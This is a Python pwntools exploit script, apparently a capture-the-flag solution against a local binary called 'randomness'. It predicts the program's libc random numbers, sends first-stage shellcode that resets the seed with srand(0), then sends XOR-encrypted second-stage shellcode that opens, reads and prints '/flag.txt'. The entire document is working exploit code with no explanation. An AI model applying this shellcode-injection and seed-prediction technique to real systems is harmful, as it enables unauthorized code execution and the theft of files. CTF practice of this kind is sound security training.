from pwn import *   
from pwn import u64
import math
import ctypes

e = context.binary = ELF('./randomness')
libc = ctypes.CDLL("./libc.so.6")
libc.srand(0)

p = process(e.path)
# gdb.attach(p, gdbscript="""
#     b *main+443
# """)

def randnum():
    num = 0
    for _ in range(8):
        num = (num << 8) | (libc.rand() & 0xff)
    return num

def encrypt_payload(payload, length):
    res = []
    for i in range(length):
        key = (randnum() << (8 * ((7 - i) % 8))) & 0xffffffffffffffff
        num = u64(payload[i*8:(i+1)*8])
        res.append(num ^ key)
    return res

p.recvuntil(b"Offset: ")
offset = int(p.recvline().strip(), 16)
log.info(f"Offset: {hex(offset)}")

# Stage 1: change srand seed to 0
sc1 = f"""
    xor edi, edi
    call ${-(offset+8+2-139)}
"""
payload1 = asm(sc1)
payload1 = payload1.ljust(0x8, b"\x90")
p.sendlineafter(b"number: ", b"1")
p.sendlineafter(b"> ", str(u64(payload1)).encode())

# Stage 2
sc2 = shellcraft.linux.openat(-100,"/flag.txt")
sc2 += shellcraft.linux.read("rax", "rsp", 0x30)
sc2 += shellcraft.linux.write(1, "rsp", 0x30)
payload2 = asm(sc2)
length = math.ceil(len(payload2) / 8)
payload2 = payload2.ljust(length * 8, b"\x90")
payload2 = encrypt_payload(payload2, length)

p.sendlineafter(b"number: ", str(length).encode())
for i in payload2:
    p.sendlineafter(b"> ", str(i).encode())

p.interactive()